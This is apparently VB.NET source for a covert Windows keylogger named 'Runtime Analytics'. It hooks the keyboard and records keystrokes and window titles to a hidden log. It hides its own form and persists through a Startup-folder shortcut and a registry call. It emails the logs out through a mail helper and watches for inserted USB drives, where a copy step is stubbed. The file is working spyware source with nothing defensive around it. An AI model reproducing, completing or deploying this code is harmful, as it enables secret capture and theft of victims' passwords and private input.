Imports System.IO
Imports Microsoft.Win32
Imports Runtime_Analytics.SendMail
Public Class Form1
    Private sendMailFn As New Runtime_Analytics.SendMail
    Dim WithEvents K As New Keyboard
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, lpstring As String, ByVal cch As Int32) As Int32
    Dim strin As String = Nothing
    Private running As Boolean = False
    Private save_dir As String = My.Computer.FileSystem.SpecialDirectories.MyDocuments & ".\Keymon"
    Private WithEvents watcher As USBWatcher
    Private Sub K_Down(ByVal Key As String) Handles K.Down
        IO.File.AppendAllText(save_dir & ".\logs.txt", Key)
    End Sub
    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If IO.File.Exists(save_dir & ".\logs.txt") = False Then
            IO.Directory.CreateDirectory(save_dir)
            Dim writer As New IO.StreamWriter(save_dir & ".\logs.txt")
            writer.Write("")
            writer.Close()
            create_startup_shortcut()
            set_reg()
        End If
        BackgroundWorker1.RunWorkerAsync()
        watcher = New USBWatcher
        watcher.StartWatching()
        start_key_logger()
        hideapp()
    End Sub
    Private Sub hideapp()
        Me.Hide()
    End Sub
    Private Sub watcher_DeviceAdded(sender As Object,
            e As USBWatcher.USBWatcherEventArgs) Handles watcher.DeviceAdded
        Dim msg As String = String.Format("Drive {0} ({1})   {2}",
                                      e.DriveLetter,
                                      e.VolumeName, "Inserted")
        'Execute copy procedure
    End Sub
    Public Sub create_startup_shortcut()
        Dim objShell As Object
        Dim objLink As Object

        Try
            objShell = CreateObject("WScript.Shell")
            objLink = objShell.CreateShortcut("C:\Users\" & Environment.UserName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" & "\Runtime Analytics.lnk")
            objLink.TargetPath = Application.ExecutablePath
            objLink.WindowStyle = 7

            objLink.Save()

        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub timerKeys_Tick(sender As Object, e As EventArgs) Handles timerKeys.Tick
        If strin <> GetActiveWindowTitle() Then
            TextBox1.Text = TextBox1.Text + vbNewLine + "[" + GetActiveWindowTitle() + "]" + vbNewLine
            IO.File.AppendAllText(save_dir & ".\logs.txt", vbNewLine + "[" + GetActiveWindowTitle() + "]" + vbNewLine)
            strin = GetActiveWindowTitle()
        End If
    End Sub

    Private Sub timerSave_Tick(sender As Object, e As EventArgs) Handles timerSave.Tick
        If strin <> GetActiveWindowTitle() Then
            TextBox1.Text = TextBox1.Text + vbNewLine + GetActiveWindowTitle() + vbNewLine
            IO.File.AppendAllText(My.Computer.FileSystem.CurrentDirectory + "\log.txt", vbNewLine + "[" + GetActiveWindowTitle() + "]" + vbNewLine)
            strin = GetActiveWindowTitle()
        End If
        My.Computer.FileSystem.WriteAllText(save_dir & ".\logs.txt", TextBox1.Text, True)
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If strin <> GetActiveWindowTitle() Then
            TextBox1.Text = TextBox1.Text + vbNewLine + GetActiveWindowTitle() + vbNewLine
            IO.File.AppendAllText(My.Computer.FileSystem.CurrentDirectory + "\log.txt", vbNewLine + "[" + GetActiveWindowTitle() + "]" + vbNewLine)
            strin = GetActiveWindowTitle()
        End If
        My.Computer.FileSystem.WriteAllText(save_dir & ".\logs.txt", TextBox1.Text, True)
    End Sub
    Private Sub start_key_logger()
        TextBox1.Clear()
        TextBox1.Text = "---------- Key Monitoring Started ----------" & vbNewLine & Now & vbNewLine & "--------------------------------------------" & vbNewLine
        IO.File.AppendAllText(save_dir & ".\logs.txt", vbNewLine & TextBox1.Text)
        K.CreateHook()
        timerKeys.Start()
    End Sub
    Private Sub stop_key_logger()
        K.DiposeHook()
        timerKeys.Stop()
        IO.File.AppendAllText(save_dir & ".\logs.txt", vbNewLine & "---------- Key Monitoring Stopped ----------" & vbNewLine)
        TextBox1.Clear()
        TextBox1.Text = "Logs Saved To " & save_dir
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try

            If needs_sending() = True Then
                needs_pause = True
                sendMailFn.send_email(get_due_date())
                needs_pause = False
            End If

        Catch ex As Exception

        End Try
    End Sub
    Private needs_pause As Boolean = False
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If needs_pause = True Then
            stop_key_logger()
        Else
            start_key_logger()
        End If
    End Sub
End Class
